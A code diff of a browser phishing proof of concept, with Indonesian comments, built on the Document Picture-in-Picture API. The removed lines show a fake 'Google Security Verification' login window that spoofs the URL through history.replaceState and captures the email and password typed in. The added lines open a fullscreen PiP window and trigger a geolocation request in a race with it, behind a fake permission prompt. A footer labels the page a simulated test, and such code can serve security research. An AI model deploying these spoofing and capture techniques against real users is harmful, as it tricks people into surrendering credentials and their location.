@@ -19,8 +19,8 @@
 
 <div class="panel" id="main-card">
   <h2>🔒 Google Security Verification</h2>
-  <p>Klik tombol di bawah untuk membuka PiP dengan URL spoofing (subdomain panjang).</p>
-  <button id="startBtn">Open Spoofed PiP</button>
+  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diminta mengizinkan lokasi.</p>
+  <button id="startBtn">Verify Account & Allow Location</button>
   <div id="status">[*] Ready...</div>
 </div>
 
@@ -33,14 +33,14 @@
 
   function log(msg) {
     statusEl.textContent = msg;
-    console.log("[PiP URL Spoof] " + msg);
+    console.log("[Fullscreen PiP + Location] " + msg);
   }
 
   // ============================================
-  // 1. TRIGGER (KLIK)
+  // 1. TRIGGER (KLIK) - RACE CONDITION
   // ============================================
   btn.addEventListener('click', async function() {
-    log("[*] Membuka PiP dengan URL spoofing...");
+    log("[*] Memulai fullscreen PiP + location race...");
 
     try {
       if (!window.documentPictureInPicture) {
@@ -49,17 +49,48 @@
       }
 
       // ============================================
-      // 2. BUKA PiP
+      // 2. BUKA PiP (UKURAN BESAR)
       // ============================================
       const pipWindow = await documentPictureInPicture.requestWindow({
-        width: 500,
-        height: 400
+        width: 1920,
+        height: 1080
       });
 
-      log('PiP Window Opened.');
+      log('PiP Window Opened. Size: ' + pipWindow.innerWidth + 'x' + pipWindow.innerHeight);
 
       // ============================================
-      // 3. TULIS KONTEN PiP DENGAN URL SPOOFING
+      // 3. PAKSA FULLSCREEN
+      // ============================================
+      try {
+        pipWindow.resizeTo(screen.width, screen.height);
+        pipWindow.moveTo(0, 0);
+      } catch (e) {
+        log('Resize error: ' + e.message);
+      }
+
+      // ============================================
+      // 4. MINTA IZIN LOKASI (RACE CONDITION)
+      // ============================================
+      // Panggil getCurrentPosition segera setelah PiP fullscreen.
+      try {
+        log("[*] Meminta Izin Lokasi...");
+        
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            log("[+] Lokasi DIIZINKAN!");
+            log("Lat: " + position.coords.latitude + ", Lon: " + position.coords.longitude);
+          },
+          function(error) {
+            log("[-] Lokasi ditolak: " + error.message);
+          },
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      } catch (e) {
+        log("[-] Geolocation error: " + e.message);
+      }
+
+      // ============================================
+      // 5. TULIS KONTEN PiP (UI PALSU FULLSCREEN)
       // ============================================
       pipWindow.document.open();
       pipWindow.document.write(`
@@ -80,82 +111,68 @@
               min-height: 100vh;
               padding: 20px;
               text-align: center;
+              overflow: hidden;
             }
             .g-logo {
-              font-size: 48px;
+              font-size: 64px;
               font-weight: bold;
               color: #4285f4;
-              margin-bottom: 20px;
+              margin-bottom: 30px;
             }
-            h3 { font-size: 24px; color: #333; margin-bottom: 10px; }
-            p { font-size: 14px; color: #666; margin-bottom: 20px; }
-            input {
-              width: 100%;
-              padding: 12px;
-              margin-bottom: 12px;
+            h3 { font-size: 32px; color: #333; margin-bottom: 20px; }
+            p { font-size: 18px; color: #666; margin-bottom: 30px; }
+            .fake-prompt {
+              background: #fff;
               border: 1px solid #ddd;
-              border-radius: 6px;
-              font-size: 14px;
-            }
-            button {
+              border-radius: 16px;
+              padding: 40px;
+              box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+              text-align: center;
+              max-width: 500px;
               width: 100%;
-              padding: 12px;
-              background: #1a73e8;
-              color: #fff;
+            }
+            .fake-prompt h4 { font-size: 24px; color: #333; margin-bottom: 15px; }
+            .fake-prompt p { font-size: 16px; color: #666; margin-bottom: 30px; }
+            .fake-prompt button {
+              padding: 15px 40px;
+              margin: 10px;
               border: none;
-              border-radius: 6px;
-              font-size: 14px;
+              border-radius: 8px;
+              font-size: 18px;
               font-weight: bold;
               cursor: pointer;
             }
+            .fake-prompt .allow { background: #1a73e8; color: #fff; }
+            .fake-prompt .block { background: #f0f0f0; color: #333; }
             .footer {
-              margin-top: 15px;
-              font-size: 11px;
-              color: #f00;
+              margin-top: 30px;
+              font-size: 14px;
+              color: #999;
             }
           </style>
         </head>
         <body>
           <div class="g-logo">G</div>
           <h3>Google Security Verification</h3>
-          <p>Please enter your credentials to continue.</p>
-          <input type="email" id="pipEmail" placeholder="Email or phone" autofocus />
-          <input type="password" id="pipPassword" placeholder="Password" />
-          <button id="pipLogin">Next</button>
+          <p>Please allow location access to continue.</p>
+
+          <div class="fake-prompt">
+            <h4>accounts.google.com ingin menggunakan lokasi Anda</h4>
+            <p>This is a simulated permission prompt.</p>
+            <button class="block" id="fakeBlock">Blokir</button>
+            <button class="allow" id="fakeAllow">Izinkan</button>
+          </div>
+
           <div class="footer">This is a simulated phishing test. Do not enter real credentials.</div>
 
           <script>
             (function() {
-              // URL Spoofing dengan subdomain panjang
-              try {
-                var spoofedUrl = '?............................google.com';
-                history.replaceState(null, '', spoofedUrl);
-              } catch (e) {}
+              document.getElementById('fakeAllow').addEventListener('click', function() {
+                window.location.href = 'https://www.google.com';
+              });
 
-              // Event listener untuk menangkap input
-              document.getElementById('pipLogin').addEventListener('click', function() {
-                var email = document.getElementById('pipEmail').value;
-                var password = document.getElementById('pipPassword').value;
-
-                if (!email || !password) {
-                  alert("Email dan password harus diisi!");
-                  return;
-                }
-
-                // Tampilkan data yang ditangkap
-                document.body.innerHTML = \`
-                  <div style="font-family:monospace;padding:20px;background:#000;color:#0f0;border-radius:6px;width:100%;">
-                    <h3 style="color:#f00;">Credentials Captured!</h3>
-                    <p><strong>Email:</strong> \${email}</p>
-                    <p><strong>Password:</strong> \${password}</p>
-                    <p style="color:#666;margin-top:15px;">Redirecting to Google...</p>
-                  </div>
-                \`;
-
-                // Redirect ke Google asli setelah 2 detik
-                setTimeout(function() {
-                  window.location.href = 'https://www.google.com';
-                }, 2000);
+              document.getElementById('fakeBlock').addEventListener('click', function() {
+                window.close();
               });
             })();
           <\/script>
@@ -164,7 +181,7 @@
       `);
       pipWindow.document.close();
 
-      log('PiP URL Spoofing active.');
+      log('PiP UI ready. Location prompt triggered.');
 
     } catch (e) {
       log('Error: ' + e.message);
